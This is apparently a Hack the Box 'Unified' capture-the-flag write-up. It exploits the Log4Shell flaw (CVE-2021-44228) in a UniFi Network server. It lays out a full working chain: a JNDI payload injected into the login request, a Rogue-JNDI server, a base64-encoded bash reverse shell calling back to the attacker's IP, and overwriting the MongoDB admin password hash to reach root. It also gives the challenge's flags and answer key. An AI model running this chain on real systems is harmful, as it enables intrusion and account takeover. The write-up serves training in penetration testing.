# Unified
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Unified
* Topic: CVE, java, maven
* Difficulty: Very easy
* Date: 15-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. What ports are open?
 - **22,6789,8080,8443**
2. Name of the software that is running on the highest port?
- **UniFi Network**
3. What is the version of the software that is running? 
- **6.4.54**
4. What is the CVE for the identified vulnerability?
- **CVE-2021-44228**
5. What is the version of Maven that we installed? 
- **3.6.3**
6. What protocol does JNDI leverage in the injection? 
- **LDAP**
7. What tool do we use to intercept the traffic, indicating the attack was successful? 
- **tcpdump**
8. What port do we need to inspect intercepted traffic for? 
- **389**
9. What port is the MongoDB service running on? 
- **27117**
10. What is the default database name for UniFi applications? 
 - **ace**
 11. What is the function we use to enumerate users within the database in MongoDB? 
  - **db.admin.find()**
  12. What is the function to add data to the database in MongoDB? 
  - **db.admin.insert()**
  13. What is the function we use to update users within the database in MongoDB? 
  - **db.admin.update()**
  14. What is the password for the root user? 
  - ****
   15. Submit user flag
  - **6ced1a6a89e666c0620cdb10262ba127**

---
## Flag:
nmap:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.28.168
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 04:51 EDT
Nmap scan report for 10.129.28.168
Host is up (0.073s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Fri, 15 Apr 2022 08:51:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Fri, 15 Apr 2022 08:51:20 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 15 Apr 2022 08:51:20 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.28.168:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24

(...)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.93 seconds

```

The web page, a login screen:

![](./attachments/Pasted%20image%2020220415110325.png)

We can exploit a vulnerability in [this version](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) of the software.

We need to edit the request in order to confirm this vulnerability. We can use Burp for that.

Fire up Burp and set it to intercept all request/responses.

Then we need to provide the login screen with some random credentials and catch the login request.

![](./attachments/Pasted%20image%2020220415111300.png)

In Burp we need to insert our payload into the `remember` field in the request.

Payload: `"${jndi:ldap://10.10.14.15/whatever}"`

![](./attachments/Pasted%20image%2020220415111234.png)

In tcpdump we can now see that we receive a connection from the server, this confirms that we can make it execute commands.

```console
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:37:11.888625 IP 10.129.28.168.42178 > 10.10.14.15.ldap: Flags [S], seq 3210065072, win 64240, options [mss 1285,sackOK,TS val 1658415904 ecr 0,nop,wscale 7], length 0
05:37:11.888642 IP 10.10.14.15.ldap > 10.129.28.168.42178: Flags [R.], seq 0, ack 3210065073, win 0, length 0
```

We need three things in order to make this exploit work, first [[Java]] and [[Maven]].

```console 
┌──(kali㉿kali)-[~]
└─$ sudo apt install openjdk-11-jdk -y

(...)

┌──(kali㉿kali)-[~]
└─$ java -version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "11.0.14.1" 2022-02-08
OpenJDK Runtime Environment (build 11.0.14.1+1-post-Debian-1)
OpenJDK 64-Bit Server VM (build 11.0.14.1+1-post-Debian-1, mixed mode, sharing)

┌──(kali㉿kali)-[~]
└─$ sudo apt install maven -y

┌──(kali㉿kali)-[~]
└─$ mvn -v     
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Apache Maven 3.6.3
Maven home: /usr/share/maven
Java version: 11.0.14.1, vendor: Debian, runtime: /usr/lib/jvm/java-11-openjdk-amd64
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "5.16.0-kali7-amd64", arch: "amd64", family: "unix"
```

Lastly, we need to get [Rogue JNDI](https://github.com/veracode-research/rogue-jndi) and use [[Maven]] to build it.

```console 
┌──(kali㉿kali)-[~/Downloads]
└─$ git clone https://github.com/veracode-research/rogue-jndi
Cloning into 'rogue-jndi'...
remote: Enumerating objects: 80, done.
remote: Counting objects: 100% (80/80), done.
remote: Compressing objects: 100% (55/55), done.
remote: Total 80 (delta 30), reused 53 (delta 16), pack-reused 0
Receiving objects: 100% (80/80), 24.50 KiB | 3.06 MiB/s, done.
Resolving deltas: 100% (30/30), done.
                       
┌──(kali㉿kali)-[~/Downloads]
└─$ cd rogue-jndi 
                         
┌──(kali㉿kali)-[~/Downloads/rogue-jndi]
└─$ ls
LICENSE  pom.xml  README.md  src
       
┌──(kali㉿kali)-[~/Downloads/rogue-jndi]
└─$ mvn package
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[INFO] Scanning for projects...
[INFO] 
[INFO] ------------------------< RogueJndi:RogueJndi >-------------------------
[INFO] Building RogueJndi 1.1
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]

(...)

[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  5.648 s
[INFO] Finished at: 2022-04-15T05:54:49-04:00
[INFO] ------------------------------------------------------------------------
```

In order for Rogue-JNDI to run, we need to construct and give it a payload. We will encode it in bas64 to avoid any encoding issues.

```console
┌──(kali㉿kali)-[~/Downloads/rogue-jndi]
└─$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.15/4444 0>&1' | base64 
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCAwPiYxCg==
```

And start Rogue-JNDI:

```console
┌──(kali㉿kali)-[~/Downloads/rogue-jndi]
└─$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTUvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.15"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.15:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.15:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.15:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.15:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.15:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.15:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.15:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.15:1389/o=reference to artsploit.controllers.RemoteReference
```

And lastly, before execution, we just need to set up netcat to listen to port 4444.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 4444                
listening on [any] 4444 ...
```

Now for the execution.

Payload: `"${jndi:ldap://10.10.14.15:1389/o=tomcat}"`

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 4444                
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.28.168] 58794
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ whoami
unifi
```

We got a shell!

```console
unifi@unified:/usr/lib/unifi$ pwd
/usr/lib/unifi
unifi@unified:/usr$ cd /home
cd /home
unifi@unified:/home$ ls
ls
michael
unifi@unified:/home$ cd michael
cd michael
unifi@unified:/home/michael$ ls
ls
user.txt
unifi@unified:/home/michael$ cat user.txt
cat user.txt
6ced1a6a89e666c0620cdb10262ba127
```

The user flag: `6ced1a6a89e666c0620cdb10262ba127`

Now it is time to go for root. Following the [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi), we need to check if MongoDB is running.

```console
unifi@unified:/$ ps aux | grep mongo
unifi         67  0.4  4.1 1100676 84848 ?       Sl   09:50   0:28 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi       3299  0.0  0.0  11468  1052 pts/0    S+   11:48   0:00 grep mongo
```

It is.

```console
unifi@unified:/$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",

(...)		
		
unifi@unified:/$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$DG3nklAGRY8RQtzx$l3Pqg4zmHRXNZwa.3sBesr12HpG.m9Jwt7PJQ23Yjmjcg.iqMmhM1t6QZ.iaGHnG3FutYkTbcTWtttArdz.9k/"}})'
<jmjcg.iqMmhM1t6QZ.iaGHnG3FutYkTbcTWtttArdz.9k/"}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

unifi@unified:/$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
<17 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$DG3nklAGRY8RQtzx$l3Pqg4zmHRXNZwa.3sBesr12HpG.m9Jwt7PJQ23Yjmjcg.iqMmhM1t6QZ.iaGHnG3FutYkTbcTWtttArdz.9k/",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",

(...)
```

We should now be able to log in with the new password!

![](./attachments/Pasted%20image%2020220415131940.png)

We are in!

![](./attachments/Pasted%20image%2020220415132048.png)

UniFi has an ssh implementation we can make use of:

![](./attachments/Pasted%20image%2020220415132938.png)

The root password for the SSH login is visible in clear text.

User:pass `root:NotACrackablePassword4U2022`

Let's connect.

```console
┌──(kali㉿kali)-[~]
└─$ ssh root@10.129.28.168       
The authenticity of host '10.129.28.168 (10.129.28.168)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.28.168' (ED25519) to the list of known hosts.
root@10.129.28.168's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

root@unified:~# ls
root.txt
root@unified:~# cat root.txt
e50bc93c75b634e4b272d2f771c33681
```

We got root!

**Flag:** `e50bc93c75b634e4b272d2f771c33681`

---
**Tags:** [[HackTheBox]]